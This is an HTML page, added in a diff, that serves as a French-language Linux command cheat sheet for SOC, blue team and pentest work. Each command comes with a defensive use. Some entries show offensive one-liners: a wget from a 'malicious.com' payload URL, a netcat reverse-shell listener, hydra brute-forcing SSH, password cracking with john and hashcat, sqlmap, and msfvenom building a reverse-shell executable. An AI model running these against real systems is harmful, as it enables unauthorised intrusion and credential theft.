@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bash Master | NCRC</title>
+<style>
+  :root{
+    --bg:#0a0e0f;
+    --panel:#111817;
+    --border:#1f2c2a;
+    --green:#00ff9c;
+    --gold:#ffd166;
+    --text:#d7e0de;
+    --muted:#8aa39d;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Consolas','Courier New',monospace;
+    padding-bottom:60px;
+  }
+  header{
+    padding:30px 20px;
+    text-align:center;
+    border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg,#0d1413,#0a0e0f);
+  }
+  header h1{
+    color:var(--green);
+    font-size:2.2rem;
+    margin:0 0 8px;
+    text-shadow:0 0 10px rgba(0,255,156,0.4);
+  }
+  header p{color:var(--muted);margin:0;}
+  a.back{
+    display:inline-block;
+    margin-top:15px;
+    color:var(--gold);
+    text-decoration:none;
+    border:1px solid var(--gold);
+    padding:6px 14px;
+    border-radius:6px;
+    font-size:0.85rem;
+  }
+  a.back:hover{background:var(--gold);color:#000;}
+
+  .search-wrap{
+    max-width:600px;
+    margin:25px auto;
+    padding:0 20px;
+  }
+  #search{
+    width:100%;
+    padding:14px 18px;
+    font-size:1rem;
+    background:var(--panel);
+    border:1px solid var(--border);
+    color:var(--text);
+    border-radius:8px;
+    font-family:inherit;
+  }
+  #search:focus{outline:none;border-color:var(--green);}
+  #count{
+    text-align:center;
+    color:var(--muted);
+    font-size:0.85rem;
+    margin-bottom:10px;
+  }
+
+  .category{
+    max-width:1100px;
+    margin:0 auto 10px;
+    padding:0 20px;
+  }
+  .category h2{
+    color:var(--gold);
+    border-bottom:1px solid var(--border);
+    padding-bottom:8px;
+    margin-top:40px;
+  }
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
+    gap:16px;
+    margin-top:16px;
+  }
+  .card{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:16px;
+    transition:0.2s;
+  }
+  .card:hover{
+    border-color:var(--green);
+    transform:translateY(-2px);
+  }
+  .card h3{
+    color:var(--green);
+    margin:0 0 8px;
+    font-size:1.1rem;
+  }
+  .card p{
+    color:var(--text);
+    font-size:0.88rem;
+    margin:0 0 10px;
+    line-height:1.4;
+  }
+  .card code{
+    display:block;
+    background:#000;
+    color:#7fffd4;
+    padding:8px 10px;
+    border-radius:5px;
+    font-size:0.82rem;
+    overflow-x:auto;
+    margin-bottom:8px;
+  }
+  .card .soc{
+    font-size:0.78rem;
+    color:var(--gold);
+    border-left:2px solid var(--gold);
+    padding-left:8px;
+  }
+  .hidden{display:none;}
+
+  ::-webkit-scrollbar{width:8px;}
+  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px;}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>💻 BASH MASTER</h1>
+  <p>Guide de commandes Linux orienté SOC / Blue Team / Pentest</p>
+  <a href="../projects.html" class="back">← Retour aux projets</a>
+</header>
+
+<div class="search-wrap">
+  <input type="text" id="search" placeholder="Rechercher une commande... (ex: grep, find, chmod)">
+  <div id="count"></div>
+</div>
+
+<div id="commands-container"></div>
+
+<script>
+const data = [
+{cat:"Navigation & Fichiers", cmds:[
+  {name:"cd", desc:"Changer de répertoire courant.", ex:"cd /var/log", soc:"Déplacement rapide vers les logs lors d'une investigation."},
+  {name:"ls -la", desc:"Lister fichiers cachés et permissions.", ex:"ls -la /home/user", soc:"Vérifier fichiers cachés suspects (.bash_history modifié, etc.)."},
+  {name:"pwd", desc:"Afficher le répertoire courant.", ex:"pwd", soc:"Confirmer sa position avant d'exécuter un script sensible."},
+  {name:"find", desc:"Rechercher des fichiers selon critères.", ex:"find / -name '*.php' -mtime -1", soc:"Trouver des webshells récemment déposés."},
+  {name:"locate", desc:"Recherche rapide via base indexée.", ex:"locate passwd", soc:"Localisation rapide de fichiers sensibles."},
+  {name:"tree", desc:"Afficher arborescence.", ex:"tree /etc", soc:"Vue d'ensemble rapide d'une structure suspecte."},
+  {name:"cp", desc:"Copier fichiers/dossiers.", ex:"cp -r /var/log /tmp/backup", soc:"Sauvegarder logs avant altération possible."},
+  {name:"mv", desc:"Déplacer/renommer.", ex:"mv suspect.sh /quarantine/", soc:"Isoler un fichier malveillant."},
+  {name:"rm", desc:"Supprimer fichiers.", ex:"rm -rf /tmp/test", soc:"Attention: souvent utilisé par attaquants pour effacer traces."},
+  {name:"mkdir", desc:"Créer un dossier.", ex:"mkdir /quarantine", soc:"Créer un espace d'analyse isolé."},
+  {name:"touch", desc:"Créer fichier vide / changer timestamp.", ex:"touch -d '2024-01-01' file", soc:"Détection de falsification de timestamps (timestomping)."},
+  {name:"stat", desc:"Afficher métadonnées détaillées.", ex:"stat file.txt", soc:"Vérifier dates MAC (Modify/Access/Change) en forensic."},
+  {name:"ln -s", desc:"Créer lien symbolique.", ex:"ln -s /etc/passwd link", soc:"Détecter des liens symboliques malveillants."},
+  {name:"basename/dirname", desc:"Extraire nom/chemin d'un fichier.", ex:"basename /var/log/syslog", soc:"Scripting d'analyse automatisée de logs."},
+  {name:"readlink -f", desc:"Résoudre chemin absolu réel.", ex:"readlink -f script.sh", soc:"Vérifier la vraie cible d'un lien suspect."},
+  {name:"rsync", desc:"Synchroniser fichiers/dossiers.", ex:"rsync -av /logs/ backup/", soc:"Sauvegarde d'image forensic incrémentale."},
+  {name:"pushd/popd", desc:"Naviguer avec pile de répertoires.", ex:"pushd /var/log", soc:"Navigation rapide multi-dossiers en investigation."},
+  {name:"lsblk", desc:"Lister périphériques de bloc.", ex:"lsblk", soc:"Identifier disques/partitions ajoutés (clé USB suspecte)."}
+]},
+{cat:"Recherche & Texte", cmds:[
+  {name:"grep", desc:"Rechercher motif dans texte.", ex:"grep 'Failed password' /var/log/auth.log", soc:"Détection tentatives de brute-force SSH."},
+  {name:"awk", desc:"Traitement de texte par colonnes.", ex:"awk '{print $1}' access.log", soc:"Extraire IPs sources d'un log web."},
+  {name:"sed", desc:"Édition de flux (remplacement).", ex:"sed 's/error/ERROR/g' log.txt", soc:"Normaliser logs avant analyse SIEM."},
+  {name:"cut", desc:"Extraire colonnes/champs.", ex:"cut -d':' -f1 /etc/passwd", soc:"Lister rapidement tous les utilisateurs système."},
+  {name:"sort", desc:"Trier lignes.", ex:"sort -n -k1 data.txt", soc:"Trier événements par fréquence ou horodatage."},
+  {name:"uniq -c", desc:"Compter occurrences uniques.", ex:"sort ips.txt | uniq -c | sort -nr", soc:"Identifier IP la plus active dans une attaque."},
+  {name:"wc -l", desc:"Compter lignes/mots/caractères.", ex:"wc -l access.log", soc:"Volumétrie rapide d'un fichier de log."},
+  {name:"head/tail", desc:"Afficher début/fin d'un fichier.", ex:"tail -f /var/log/syslog", soc:"Surveillance en temps réel des logs système."},
+  {name:"diff", desc:"Comparer deux fichiers.", ex:"diff old_config.txt new_config.txt", soc:"Détecter modification non autorisée d'un fichier de config."},
+  {name:"xargs", desc:"Construire commandes depuis stdin.", ex:"find . -name '*.log' | xargs grep 'error'", soc:"Recherche massive dans plusieurs fichiers."},
+  {name:"tr", desc:"Remplacer/supprimer caractères.", ex:"cat file | tr 'a-z' 'A-Z'", soc:"Nettoyage de données avant parsing."},
+  {name:"tee", desc:"Écrire dans fichier et stdout.", ex:"cmd | tee output.log", soc:"Sauvegarder résultat d'analyse tout en le visualisant."},
+  {name:"less/more", desc:"Visualiser fichier paginé.", ex:"less /var/log/auth.log", soc:"Lecture confortable de gros fichiers de logs."},
+  {name:"column -t", desc:"Formatter en colonnes alignées.", ex:"column -t /etc/passwd", soc:"Lisibilité améliorée pour rapport d'investigation."},
+  {name:"comm", desc:"Comparer fichiers triés ligne à ligne.", ex:"comm -3 file1 file2", soc:"Identifier différences entre deux listes d'IPs."},
+  {name:"paste", desc:"Fusionner lignes de fichiers.", ex:"paste file1 file2", soc:"Corréler deux sources de données côte à côte."}
+]},
+{cat:"Réseau", cmds:[
+  {name:"ping", desc:"Tester connectivité.", ex:"ping -c 4 8.8.8.8", soc:"Vérifier accessibilité d'un hôte suspect."},
+  {name:"curl", desc:"Requêtes HTTP/API.", ex:"curl -I https://site.com", soc:"Analyser headers HTTP d'un serveur suspect."},
+  {name:"wget", desc:"Télécharger fichiers.", ex:"wget http://malicious.com/payload", soc:"Récupérer un échantillon pour analyse sandbox."},
+  {name:"netstat -tulpn", desc:"Lister connexions/ports.", ex:"netstat -tulpn", soc:"Détecter connexions sortantes suspectes (C2)."},
+  {name:"ss -tulpn", desc:"Alternative moderne à netstat.", ex:"ss -tulpn", soc:"Plus rapide pour audit de ports ouverts."},
+  {name:"nmap", desc:"Scanner de ports/réseau.", ex:"nmap -sV -A 192.168.1.0/24", soc:"Cartographier surface d'attaque du réseau."},
+  {name:"traceroute", desc:"Tracer chemin réseau.", ex:"traceroute site.com", soc:"Identifier trajet suspect vers un C2."},
+  {name:"dig", desc:"Requêtes DNS détaillées.", ex:"dig site.com ANY", soc:"Analyser infrastructure DNS d'un domaine malveillant."},
+  {name:"nslookup", desc:"Résolution DNS simple.", ex:"nslookup site.com", soc:"Vérification rapide de résolution DNS."},
+  {name:"tcpdump", desc:"Capturer trafic réseau.", ex:"tcpdump -i eth0 port 443", soc:"Capture de paquets pour analyse d'intrusion."},
+  {name:"ip a", desc:"Afficher interfaces réseau.", ex:"ip a", soc:"Vérifier interfaces actives sur machine compromise."},
+  {name:"iptables -L", desc:"Lister règles firewall.", ex:"iptables -L -v -n", soc:"Vérifier si un attaquant a modifié le firewall."},
+  {name:"nc (netcat)", desc:"Connexions TCP/UDP brutes.", ex:"nc -lvp 4444", soc:"Simuler ou détecter un reverse shell."},
+  {name:"arp -a", desc:"Table ARP locale.", ex:"arp -a", soc:"Détecter ARP spoofing sur réseau local."},
+  {name:"route -n", desc:"Table de routage.", ex:"route -n", soc:"Vérifier routes ajoutées malicieusement."},
+  {name:"whois", desc:"Info sur propriétaire domaine/IP.", ex:"whois malicious.com", soc:"Attribution d'une infrastructure d'attaque."},
+  {name:"host", desc:"Résolution DNS simple.", ex:"host site.com", soc:"Vérification rapide d'un nom de domaine suspect."},
+  {name:"scp/sftp", desc:"Transfert de fichiers sécurisé.", ex:"scp file user@host:/path", soc:"Exfiltration légitime de preuves forensic."}
+]},
+{cat:"Processus & Système", cmds:[
+  {name:"ps aux", desc:"Lister tous les processus.", ex:"ps aux | grep python", soc:"Identifier processus malveillants actifs."},
+  {name:"top / htop", desc:"Moniteur système temps réel.", ex:"htop", soc:"Repérer processus consommant CPU anormalement (miner)."},
+  {name:"kill / kill -9", desc:"Terminer un processus.", ex:"kill -9 1234", soc:"Arrêter un processus malveillant identifié."},
+  {name:"pkill / pgrep", desc:"Tuer/trouver processus par nom.", ex:"pkill -f suspicious_script", soc:"Éradication rapide d'un malware par nom."},
+  {name:"jobs", desc:"Lister tâches en arrière-plan.", ex:"jobs -l", soc:"Vérifier tâches cachées lancées par un attaquant."},
+  {name:"systemctl", desc:"Gérer services systemd.", ex:"systemctl status sshd", soc:"Vérifier services persistants malveillants."},
+  {name:"crontab -l", desc:"Lister tâches planifiées.", ex:"crontab -l -u root", soc:"Détecter persistance via cron malveillant."},
+  {name:"uptime", desc:"Temps depuis dernier boot.", ex:"uptime", soc:"Corréler avec horaire suspecté de compromission."},
+  {name:"df -h", desc:"Espace disque utilisé.", ex:"df -h", soc:"Détecter remplissage disque anormal (logs supprimés?)."},
+  {name:"du -sh", desc:"Taille d'un dossier.", ex:"du -sh /var/log", soc:"Identifier dossier anormalement volumineux."},
+  {name:"free -h", desc:"Utilisation mémoire.", ex:"free -h", soc:"Détecter consommation mémoire anormale (malware)."},
+  {name:"whoami / id", desc:"Utilisateur courant et groupes.", ex:"id", soc:"Vérifier niveau de privilège après compromission."},
+  {name:"uname -a", desc:"Infos noyau/système.", ex:"uname -a", soc:"Identifier version vulnérable du noyau."},
+  {name:"nice/renice", desc:"Gérer priorité processus.", ex:"renice -n 19 -p 1234", soc:"Limiter impact d'un processus suspect en cours d'analyse."},
+  {name:"vmstat", desc:"Statistiques mémoire/CPU.", ex:"vmstat 2 5", soc:"Analyse de performance lors d'une attaque DoS."},
+  {name:"dmesg", desc:"Messages noyau.", ex:"dmesg | tail -50", soc:"Détecter erreurs matérielles ou USB suspect connecté."}
+]},
+{cat:"Permissions & Sécurité", cmds:[
+  {name:"chmod", desc:"Modifier permissions.", ex:"chmod 750 script.sh", soc:"Corriger permissions trop permissives (777) sur fichier sensible."},
+  {name:"chown", desc:"Changer propriétaire.", ex:"chown root:root /etc/shadow", soc:"Restaurer propriété correcte après compromission."},
+  {name:"sudo -l", desc:"Lister privilèges sudo.", ex:"sudo -l", soc:"Vérifier surface d'escalade de privilèges."},
+  {name:"su", desc:"Changer d'utilisateur.", ex:"su - root", soc:"Vérifier logs d'utilisation abusive de su."},
+  {name:"ssh", desc:"Connexion distante sécurisée.", ex:"ssh user@10.0.0.5", soc:"Audit des connexions SSH suspectes entrantes."},
+  {name:"gpg", desc:"Chiffrement/signature.", ex:"gpg -c fichier.txt", soc:"Vérifier intégrité de fichiers de preuves."},
+  {name:"openssl", desc:"Boîte à outils crypto.", ex:"openssl s_client -connect site.com:443", soc:"Analyser certificat TLS d'un site suspect."},
+  {name:"sha256sum", desc:"Empreinte cryptographique.", ex:"sha256sum malware.exe", soc:"Vérifier hash contre base IOC (VirusTotal, etc.)."},
+  {name:"umask", desc:"Permissions par défaut.", ex:"umask 022", soc:"Vérifier configuration de sécurité par défaut du système."},
+  {name:"visudo", desc:"Éditer sudoers en sécurité.", ex:"visudo", soc:"Audit des règles sudo pour détecter backdoor."},
+  {name:"setfacl/getfacl", desc:"ACL avancées.", ex:"getfacl /etc/passwd", soc:"Vérifier permissions étendues non standards."},
+  {name:"ufw", desc:"Firewall simplifié Ubuntu.", ex:"ufw status verbose", soc:"Vérifier règles firewall actives sur endpoint."}
+]},
+{cat:"Logs & Forensic / SOC", cmds:[
+  {name:"journalctl", desc:"Logs systemd.", ex:"journalctl -u sshd --since today", soc:"Analyse ciblée des logs d'un service compromis."},
+  {name:"last", desc:"Historique connexions.", ex:"last -a", soc:"Détecter connexions à heures inhabituelles."},
+  {name:"lastlog", desc:"Dernière connexion par utilisateur.", ex:"lastlog", soc:"Identifier comptes dormants soudainement actifs."},
+  {name:"history", desc:"Historique des commandes.", ex:"history | grep wget", soc:"Retracer actions d'un attaquant sur le shell."},
+  {name:"/var/log/auth.log", desc:"Log d'authentification.", ex:"tail -100 /var/log/auth.log", soc:"Source principale pour détecter brute-force SSH."},
+  {name:"lsof", desc:"Fichiers ouverts par processus.", ex:"lsof -i :4444", soc:"Identifier processus lié à un port de reverse shell."},
+  {name:"strings", desc:"Extraire chaînes lisibles d'un binaire.", ex:"strings malware.bin | less", soc:"Analyse statique rapide d'un exécutable suspect."},
+  {name:"file", desc:"Identifier type de fichier réel.", ex:"file suspicious.exe", soc:"Détecter fichier déguisé (extension trompeuse)."},
+  {name:"md5sum", desc:"Empreinte MD5.", ex:"md5sum file.bin", soc:"Comparaison rapide avec base de signatures connues."},
+  {name:"exiftool", desc:"Métadonnées de fichiers.", ex:"exiftool photo.jpg", soc:"Extraire métadonnées cachées (GPS, auteur) en investigation."},
+  {name:"dd", desc:"Copie bit à bit.", ex:"dd if=/dev/sda of=image.dd bs=4M", soc:"Créer image forensic d'un disque compromis."},
+  {name:"wtmp/btmp", desc:"Logs binaires connexions.", ex:"utmpdump /var/log/wtmp", soc:"Analyse forensic des connexions réussies/échouées."},
+  {name:"binwalk", desc:"Analyser firmware/fichiers embarqués.", ex:"binwalk -e firmware.bin", soc:"Extraction de données cachées dans un firmware."},
+  {name:"foremost", desc:"Récupération de fichiers.", ex:"foremost -i image.dd -o output/", soc:"Récupération de fichiers supprimés en forensic."}
+]},
+{cat:"Compression & Archives", cmds:[
+  {name:"tar", desc:"Archiver fichiers.", ex:"tar -czvf archive.tar.gz /var/log", soc:"Archiver preuves collectées avant transfert."},
+  {name:"zip/unzip", desc:"Compresser/décompresser zip.", ex:"unzip suspicious.zip -d analyse/", soc:"Extraction sécurisée d'archive suspecte en sandbox."},
+  {name:"gzip/gunzip", desc:"Compression gzip.", ex:"gzip -d file.gz", soc:"Décompression de logs archivés pour analyse."},
+  {name:"7z", desc:"Archive 7zip.", ex:"7z x archive.7z", soc:"Extraction d'archives protégées par mot de passe."}
+]},
+{cat:"Scripting & Variables", cmds:[
+  {name:"export", desc:"Définir variable d'environnement.", ex:"export PATH=$PATH:/opt/tools", soc:"Ajouter outils d'analyse au PATH temporairement."},
+  {name:"alias", desc:"Créer raccourci de commande.", ex:"alias ll='ls -la'", soc:"Automatiser commandes fréquentes d'investigation."},
+  {name:"read", desc:"Lire entrée utilisateur.", ex:"read -p 'IP cible: ' ip", soc:"Scripts interactifs d'automatisation SOC."},
+  {name:"for loop", desc:"Boucle for.", ex:"for ip in $(cat ips.txt); do ping -c1 $ip; done", soc:"Scanner une liste d'IPs suspectes automatiquement."},
+  {name:"while loop", desc:"Boucle while.", ex:"while read line; do echo $line; done < file.txt", soc:"Traitement ligne par ligne d'un log volumineux."},
+  {name:"if/test [ ]", desc:"Condition en bash.", ex:"if [ -f file ]; then echo 'exists'; fi", soc:"Logique conditionnelle dans script de détection."},
+  {name:"function", desc:"Définir une fonction.", ex:"function scan(){ nmap -sV $1; }", soc:"Réutiliser logique d'investigation dans des scripts."},
+  {name:"trap", desc:"Capturer signaux.", ex:"trap 'echo Interrompu' SIGINT", soc:"Script résilient qui log une interruption suspecte."}
+]},
+{cat:"Gestion de paquets", cmds:[
+  {name:"apt", desc:"Gestionnaire de paquets Debian/Ubuntu.", ex:"apt list --installed", soc:"Vérifier logiciels installés (backdoor via paquet)."},
+  {name:"dpkg", desc:"Bas niveau paquets Debian.", ex:"dpkg -l | grep suspicious", soc:"Audit détaillé de paquets installés."},
+  {name:"pip", desc:"Gestionnaire paquets Python.", ex:"pip list", soc:"Vérifier librairies Python malveillantes installées."}
+]},
+{cat:"Hacking / Pentest", cmds:[
+  {name:"hydra", desc:"Brute-force de services.", ex:"hydra -l admin -P rockyou.txt ssh://10.0.0.5", soc:"Test de résistance aux attaques par force brute."},
+  {name:"john", desc:"Cassage de mots de passe.", ex:"john --wordlist=rockyou.txt hashes.txt", soc:"Audit de robustesse des mots de passe."},
+  {name:"hashcat", desc:"Cassage GPU de hashes.", ex:"hashcat -m 0 hash.txt rockyou.txt", soc:"Cracking rapide pour évaluer la sécurité des hashs."},
+  {name:"sqlmap", desc:"Détection/exploitation SQLi.", ex:"sqlmap -u 'http://site.com/page?id=1'", soc:"Test d'injection SQL sur application web."},
+  {name:"nikto", desc:"Scanner vulnérabilités web.", ex:"nikto -h http://site.com", soc:"Audit rapide de sécurité d'un serveur web."},
+  {name:"searchsploit", desc:"Recherche d'exploits locaux.", ex:"searchsploit apache 2.4", soc:"Vérifier exploits connus pour une version logicielle."},
+  {name:"aircrack-ng", desc:"Audit sécurité WiFi.", ex:"aircrack-ng capture.cap", soc:"Test de robustesse du chiffrement WiFi (WPA2)."},
+  {name:"msfvenom", desc:"Génération de payloads.", ex:"msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe", soc:"Création de payload de test en environnement contrôlé."}
+]}
+];
+
+const container = document.getElementById('commands-container');
+const searchInput = document.getElementById('search');
+const countEl = document.getElementById('count');
+let totalCommands = 0;
+
+function render(filter=""){
+  container.innerHTML = "";
+  let visibleCount = 0;
+  totalCommands = 0;
+
+  data.forEach(section=>{
+    totalCommands += section.cmds.length;
+    const filtered = section.cmds.filter(c=>
+      c.name.toLowerCase().includes(filter) ||
+      c.desc.toLowerCase().includes(filter)
+    );
+    if(filtered.length === 0) return;
+
+    const catDiv = document.createElement('div');
+    catDiv.className = 'category';
+    catDiv.innerHTML = `<h2>${section.cat}</h2>`;
+    const grid = document.createElement('div');
+    grid.className = 'grid';
+
+    filtered.forEach(c=>{
+      visibleCount++;
+      const card = document.createElement('div');
+      card.className = 'card';
+      card.innerHTML = `
+        <h3>${c.name}</h3>
+        <p>${c.desc}</p>
+        <code>${c.ex}</code>
+        <div class="soc">🛡️ ${c.soc}</div>
+      `;
+      grid.appendChild(card);
+    });
+
+    catDiv.appendChild(grid);
+    container.appendChild(catDiv);
+  });
+
+  countEl.textContent = filter 
+    ? `${visibleCount} commande(s) trouvée(s) sur ${totalCommands}`
+    : `${totalCommands} commandes disponibles`;
+}
+
+searchInput.addEventListener('input', e=>{
+  render(e.target.value.toLowerCase().trim());
+});
+
+document.addEventListener('keydown', e=>{
+  if(e.key === '/' && document.activeElement !== searchInput){
+    e.preventDefault();
+    searchInput.focus();
+  }
+  if(e.key === 'Escape'){
+    searchInput.value = "";
+    render();
+    searchInput.blur();
+  }
+});
+
+render();
+</script>
+
+</body>
+</html>
